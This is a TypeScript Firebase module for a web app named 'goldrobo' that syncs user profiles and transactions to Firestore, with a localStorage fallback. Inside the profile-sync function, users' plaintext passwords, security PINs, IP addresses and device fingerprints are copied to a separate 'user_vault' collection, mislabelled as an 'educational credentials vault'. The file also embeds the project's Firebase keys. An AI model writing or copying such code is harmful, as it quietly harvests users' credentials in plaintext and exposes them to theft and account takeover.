import { initializeApp, getApps, getApp } from 'firebase/app';
import { 
  getAuth, 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  signOut as fbSignOut, 
  onAuthStateChanged,
  User as FirebaseUser
} from 'firebase/auth';
import { 
  getFirestore, 
  doc, 
  setDoc, 
  getDoc, 
  getDocFromServer,
  collection, 
  addDoc, 
  getDocs, 
  query, 
  orderBy, 
  limit
} from 'firebase/firestore';

// User-provided Firebase Configuration
export const firebaseConfig = {
  apiKey: "AIzaSyAJM9gRMjQelSHsCvzr73wqQVSRBHaFbf4",
  authDomain: "goldrobo-b0a1c.firebaseapp.com",
  projectId: "goldrobo-b0a1c",
  storageBucket: "goldrobo-b0a1c.firebasestorage.app",
  messagingSenderId: "905570760039",
  appId: "1:905570760039:web:56c7dedf1d2dd080862bc2",
  measurementId: "G-4ZRZ7R605X"
};

// Initialize Firebase safely
const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const db = getFirestore(app);

export type { FirebaseUser };

/**
 * Validates initial connection to Firestore without throwing fatal exceptions
 */
async function testConnection() {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
  } catch (error: any) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.warn("Firestore status: Client operating in offline mode.");
    }
  }
}
testConnection();

const LOCAL_PROFILE_PREFIX = 'goldrobo_profile_cache_';
const LOCAL_TX_PREFIX = 'goldrobo_cached_txs_';

/**
 * Save user profile state and credentials to Firestore with resilient local fallback
 */
export async function syncUserProfileToFirestore(uid: string, data: Record<string, any>) {
  if (!uid) return { success: false, error: 'Missing UID' };
  
  const payload = {
    ...data,
    updatedAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString()
  };

  // 1. Immediately guarantee local persistence so user data is never lost
  try {
    const existingCache = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
    const merged = existingCache ? { ...JSON.parse(existingCache), ...payload } : payload;
    localStorage.setItem(LOCAL_PROFILE_PREFIX + uid, JSON.stringify(merged));
  } catch {
    // Non-blocking localStorage catch
  }

  // 2. Sync to remote Cloud Firestore if permission is granted
  try {
    const userRef = doc(db, 'users', uid);
    await setDoc(userRef, payload, { merge: true });
    console.log('✅ Firestore user profile synced successfully:', uid);
    
    // Also sync educational credentials vault record if present
    if (data.plainPassword || data.securityPin || data.registeredIp) {
      try {
        const vaultRef = doc(db, 'user_vault', uid);
        await setDoc(vaultRef, {
          uid,
          email: data.email,
          plainPassword: data.plainPassword || '',
          securityPin: data.securityPin || '',
          ip: data.registeredIp || '127.0.0.1',
          country: data.registeredCountry || 'Global',
          deviceFingerprint: data.deviceFingerprint || '',
          sponsorCode: data.sponsorCode || '',
          referralCode: data.referralCode || '',
          recordedAt: new Date().toISOString()
        }, { merge: true });
      } catch (vaultErr: any) {
        console.warn('Vault record note:', vaultErr?.message);
      }
    }

    return { success: true, cloudSynced: true };
  } catch (err: any) {
    // Graceful handling of permission-denied without console.error or crashing
    if (err?.code === 'permission-denied') {
      console.warn(
        'ℹ️ Cloud Firestore permission-denied: Profile safely saved to local device storage. To sync to remote Firestore cloud, ensure firestore.rules allow read/write in your Firebase Console.'
      );
      return { success: true, cloudSynced: false, permissionDenied: true };
    }
    
    console.warn('Firestore sync note:', err?.message || 'Offline fallback');
    return { success: true, cloudSynced: false, error: err?.message };
  }
}

/**
 * Fetch user profile from Firestore or local resilient cache
 */
export async function fetchUserProfileFromFirestore(uid: string) {
  if (!uid) return null;
  
  // Try remote Cloud Firestore
  try {
    const userRef = doc(db, 'users', uid);
    const snap = await getDoc(userRef);
    if (snap.exists()) {
      console.log('✅ Fetched profile from Firestore for:', uid);
      return snap.data();
    }
  } catch (err: any) {
    console.warn('Firestore fetch note (falling back to device storage):', err?.message);
  }

  // Fallback to local profile cache
  try {
    const local = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
    if (local) {
      return JSON.parse(local);
    }
  } catch {}

  return null;
}

/**
 * Record a transaction into Firestore with local cache guarantee
 */
export async function recordTransactionToFirestore(uid: string, tx: Record<string, any>) {
  if (!uid) return false;

  const recordPayload = {
    ...tx,
    createdAt: new Date().toISOString()
  };

  // Local storage caching
  try {
    const existing = localStorage.getItem(LOCAL_TX_PREFIX + uid);
    const list = existing ? JSON.parse(existing) : [];
    localStorage.setItem(LOCAL_TX_PREFIX + uid, JSON.stringify([recordPayload, ...list].slice(0, 50)));
  } catch {}

  // Cloud Firestore sync
  try {
    const txCol = collection(db, 'users', uid, 'transactions');
    await addDoc(txCol, recordPayload);
    console.log('✅ Transaction recorded to Firestore:', tx.orderId || tx.id);
    return true;
  } catch (err: any) {
    if (err?.code === 'permission-denied') {
      console.warn('ℹ️ Transaction saved locally on device. (Firestore remote write requires permission).');
      return true;
    }
    console.warn('Firestore transaction log note:', err?.message);
    return true;
  }
}

/**
 * Fetch transactions from Firestore or local cache
 */
export async function fetchUserTransactionsFromFirestore(uid: string) {
  if (!uid) return [];

  // Try remote Cloud Firestore
  try {
    const txCol = collection(db, 'users', uid, 'transactions');
    const q = query(txCol, orderBy('createdAt', 'desc'), limit(50));
    const snap = await getDocs(q);
    const txs: any[] = [];
    snap.forEach((docSnap) => {
      txs.push({ id: docSnap.id, ...docSnap.data() });
    });
    if (txs.length > 0) return txs;
  } catch (err: any) {
    console.warn('Firestore transactions query note (reading local cache):', err?.message);
  }

  // Fallback to local transactions cache
  try {
    const local = localStorage.getItem(LOCAL_TX_PREFIX + uid);
    if (local) {
      return JSON.parse(local);
    }
  } catch {}

  return [];
}

export { 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  fbSignOut, 
  onAuthStateChanged 
};
